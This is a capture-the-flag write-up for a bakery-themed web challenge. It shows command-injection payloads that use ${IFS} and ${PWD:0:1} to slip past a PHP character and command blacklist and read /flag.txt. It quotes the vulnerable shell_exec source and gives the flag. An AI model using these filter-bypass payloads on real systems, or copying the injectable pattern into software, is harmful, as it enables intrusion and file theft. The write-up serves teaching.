# Writeup

This new kid on the block, Bake'n'berg, has taken over the market with some new dough that has 99.2% purity. Ours is not even 60%!

Our bakers have been trying to come up with a new P2P-recipe trying all sorts of weird ingredients to raise the purity, but it's so costly this way.

Luckily, the developers at Brunnerne have come up with a `bash -c 'recipe'` that can simulate the baking process. This way we can test ingredients in a simulator to find ingredients that result in a higher purity - without wasting any ressources.

## Step 1 - Inject 

After experimenting with special characters and hex encoding, it was possible to execute arbitrary commands with an input like:

```bash
%27;ls
```

## Step 2 - Understanding the Filters

Some characters and commands are blacklisted. To bypass them we can use:
- `${IFS}` to replace spaces
- `printf` instead of `echo`
- `head` instead of `cat`

Since the pipe character is also blacklisted, a working payload to print out the `index.php` file is:

```bash
%27;head${IFS}-n${IFS}1000${IFS}index.php
```
The source revealed the following filters:
```php
'<', '(', ')', '[', ']', '\\', '"', '*', '/', ' '];
$denyListCommands = ['rm', 'mv', 'cp', 'cat', 'echo', 'touch', 'chmod', 'chown', 'kill', 'ps', 'top', 'find'];

function loadSecretRecipe() {
    file_get_contents('/flag.txt');
}

function sanitizeCharacters($input) {
    for ($i = 0; $i < strlen($input); $i++) {
        if (in_array($input[$i], $GLOBALS['denyListCharacters'], true)) {
            return 'Illegal character detected!';
        }
    }
    return $input;
}

function sanitizeCommands($input) {
    foreach ($GLOBALS['denyListCommands'] as $cmd) {
        if (stripos($input, $cmd) !== false) {
            return 'Illegal command detected!';
        }
    }
    return $input;
}

function analyze($ingredient) {
    $tmp = sanitizeCharacters($ingredient);
    if ($tmp !== $ingredient) {
        return $tmp;
    }

    $tmp = sanitizeCommands($ingredient);
    if ($tmp !== $ingredient) {
        return $tmp;
    }

    return shell_exec("bash -c './quality.sh $ingredient' 2>&1");
}
```
## Step 3 - Printing the Flag

The main obstacle is the blacklist on the `/` character. Since the flag file is stored at `/flag.txt`, we need a workaround.

The trick is to extract `/` from an environment variable that always contains it. `${PWD}` starts with `/`, so we can grab its first character using substring expansion:

```bash
%27;head${IFS}-n${IFS}1000${IFS}${PWD:0:1}flag.txt
```

## Flag

```
brunner{d1d_1_f0rg37_70_b4n_s0m3_ch4rz?}
```
